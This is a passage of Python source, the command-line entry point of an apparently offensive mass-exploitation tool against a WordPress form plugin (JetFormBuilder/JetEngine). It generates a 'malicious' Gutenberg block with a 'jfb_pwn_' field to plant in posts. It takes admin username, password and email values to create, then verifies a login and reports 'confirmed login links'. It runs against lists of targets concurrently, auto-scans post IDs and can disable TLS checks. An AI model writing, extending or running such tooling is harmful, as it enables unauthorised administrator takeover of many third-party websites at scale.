                         f"Default: {CONFIG_NAME}")
    ap.add_argument("--post-id", type=int, default=0,
                    help="Pin the post id referenced by _jet_engine_booking_form_id")
    ap.add_argument("--admin-user", default="")
    ap.add_argument("--admin-pass", default="")
    ap.add_argument("--admin-email", default="")
    ap.add_argument("--display-name", default="")
    ap.add_argument("--field-name", default="",
                    help="SSR block/field name (must match --markup output)")
    ap.add_argument("--method", choices=["ajax", "reload"], default="ajax")
    ap.add_argument("--verify", action="store_true",
                    help="Force the login step even when the plugin reply was "
                         "not JSON (single/batch)")
    ap.add_argument("--markup", action="store_true",
                    help="Print the Gutenberg block to plant + save its field "
                         "name to --config, then exit")
    ap.add_argument("--concurrency", type=int, default=10,
                    help="Max in-flight HTTP requests; throughput stays constant "
                         "no matter how long the list is (default 10)")
    ap.add_argument("--max-candidates", type=int, default=25,
                    help="Cap for auto post-id candidates per site (default 25)")
    ap.add_argument("--timeout", type=int, default=20,
                    help="Per-request total timeout in seconds (default 20)")
    ap.add_argument("--quiet", action="store_true",
                    help="Suppress live per-request output; print only the "
                         "summary and the confirmed login links")
    ap.add_argument("--insecure", action="store_true",
                    help="Disable TLS certificate verification")
    ap.add_argument("--user-agent", default="")
    args = ap.parse_args()

    cfg_path = args.config
    saved = load_config(cfg_path)

    if args.markup:
        field = args.field_name or "jfb_pwn_" + random_tag()
        save_config({"field_name": field, "post_id": args.post_id}, cfg_path)
        console.print(
            Panel(
                f"[bold]Plant this block inside ANY post content on the target "
                f"and remember the numerical post ID:[/]\n\n"
                f"{build_malicious_block(field)}\n\n"
                f"Then run with  [bold]--post-id <id> --field-name {field}[/]\n\n"
                f"[dim]field name saved in {cfg_path}; next runs reuse it "
                f"automatically.[/]",
                title="Markup (--markup)",
            )
        )
        return 0

    if not args.target and not args.list:
        # Interactive mode: we ONLY ask for the targets path and the threads
        # (parallelism) - everything else comes from args / saved state.
        try:
            args.list = input("[?] Targets list path (Enter to abort): ").strip()
        except EOFError:
            args.list = ""
        if args.list:
            try:
                q = input(
                    f"[?] Threads (parallel requests, default {args.concurrency}): "
                ).strip()
                if q.isdigit() and int(q) > 0:
                    args.concurrency = int(q)
            except EOFError:
                pass

    if args.list:
        try:
            targets = load_targets(args.list)
        except OSError as exc:
            ap.error(f"cannot read targets file: {exc}")
        if not targets:
            ap.error(f"no targets found in {args.list}")

        # Auto-manage the field name: explicit > saved-config > generate+save.
        if not (args.field_name or saved.get("field_name")):
            generated = "jfb_pwn_" + random_tag()
            save_config({"field_name": generated,
                         "post_id": saved.get("post_id", 0)}, cfg_path)
            args.field_name = generated
            if not args.quiet:
                console.print(
                    Panel(
                        f"[bold]No planted field name found.[/]\n"
                        f"A new one was generated and saved to [bold]{cfg_path}[/]: "
                        f"[cyan]{generated}[/]\n"
                        f"On sites where you already planted the SSR block with a "
                        f"DIFFERENT name, pass [bold]--field-name <that name>[/] "
                        f"or put it on the line: [bold]URL | post_id | field[/].\n"
                        f"To create the block now: [bold]--markup[/].",
                        title="Field name auto-managed",
                        border_style="cyan",
                    )
                )
        elif not (args.field_name) and saved.get("field_name"):
            args.field_name = saved["field_name"]
        # Batch never inherits the saved post id: per-site ids come only from
        # the line "URL | post_id | field" or the per-site autoscan.
        args.post_id = 0
        return asyncio.run(run_batch(args, targets))

    if not args.target:
        ap.error("target URL is required (or --list)")

    # ---- Single mode ----
    if not args.field_name and saved.get("field_name"):
        args.field_name = saved["field_name"]
    if not args.post_id and saved.get("post_id"):
        args.post_id = int(saved["post_id"])
    if not args.field_name:
        generated = "jfb_pwn_" + random_tag()
        save_config({"field_name": generated,
                     "post_id": saved.get("post_id", 0)}, cfg_path)
        args.field_name = generated
        if not args.quiet:
            console.print(
                Panel(
                    f"[yellow]No planted field name -- using newly generated "
                    f"[bold]{generated}[/][/] and saved to {cfg_path}. "
                    f"Plant it with --markup if you have not done so yet.",
                    border_style="yellow",
                )
            )

    async def _single():
        jar = aiohttp.CookieJar(unsafe=True)
        connector = aiohttp.TCPConnector(
            limit_per_host=100,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            family=0,
            happy_eyeballs_delay=0.25,
            ssl=not args.insecure,
        )
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=args.timeout),
            cookie_jar=jar,
            headers={"User-Agent": args.user_agent or DEFAULT_UA},
            trust_env=False,  # ignore dead env proxies (root cause of SKIPs)
        )
        try:
            scanner = Scanner(
                target=args.target,
                session=session,
                slot=None,
                post_id=args.post_id,
                admin_user=args.admin_user,
                admin_pass=args.admin_pass,
                admin_email=args.admin_email,
                display_name=args.display_name,
                field_name=args.field_name,
                method=args.method,
                timeout=args.timeout,
                insecure=args.insecure,
                user_agent=args.user_agent,
                max_candidates=args.max_candidates,
                quiet=args.quiet,
            )
            return await scanner.run(verify=args.verify)
        finally:
            await session.close()

    return asyncio.run(_single())


if __name__ == "__main__":
    sys.exit(main() or 0)
